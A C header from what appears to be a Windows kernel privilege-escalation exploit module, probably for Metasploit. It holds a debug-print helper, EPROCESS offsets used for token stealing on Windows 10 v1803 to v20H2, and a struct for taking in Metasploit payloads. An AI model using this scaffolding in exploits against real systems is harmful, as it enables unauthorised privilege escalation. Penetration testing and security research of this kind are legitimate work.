#pragma once

#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#ifdef DEBUGTRACE
#define dprintf(...) real_dprintf(__VA_ARGS__)
#else
#define dprintf(...) do{}while(0);
#endif

/*!
 * @brief Output a debug string to the debug console.
 * @details The function emits debug strings via `OutputDebugStringA`, hence all messages can be viewed
 *          using Visual Studio's _Output_ window, _DebugView_ from _SysInternals_, or _Windbg_.
 */
static _inline void real_dprintf(char* format, ...)
{
	va_list args;
	char buffer[1024];
	size_t len;
	_snprintf_s(buffer, sizeof(buffer), sizeof(buffer) - 1, "[%04x] ", GetCurrentThreadId());
	len = strlen(buffer);
	va_start(args, format);
	vsnprintf_s(buffer + len, sizeof(buffer) - len, sizeof(buffer) - len - 3, format, args);
	strcat_s(buffer, sizeof(buffer), "\r\n");
	OutputDebugStringA(buffer);
	va_end(args);
}

typedef struct _EPROCESS_OFFSETS {
	WORD ActiveProcessLinks;
	WORD Token;
	WORD UniqueProcessId;
} EPROCESS_OFFSETS;
typedef EPROCESS_OFFSETS* PEPROCESS_OFFSETS;

const static EPROCESS_OFFSETS EprocessOffsetsWin10v1803 = { 0x2f0, 0x360, 0x2e8 }; /* Windows 10 v1803 - v1909 */
const static EPROCESS_OFFSETS EprocessOffsetsWin10v2004 = { 0x448, 0x4b8, 0x440 }; /* Windows 10 v2004 - v20H2 */

/*
 * This struct makes the exploit compatible with a Metasploit payload of an arbitrary as constructed using something like:
 *
 * encoded_payload = payload.encoded
 * [encoded_payload.length].pack('I<') + encoded_payload
 */
typedef struct _MSF_PAYLOAD {
	DWORD  dwSize;
	CHAR  cPayloadData[];
} MSF_PAYLOAD;
typedef MSF_PAYLOAD* PMSF_PAYLOAD;
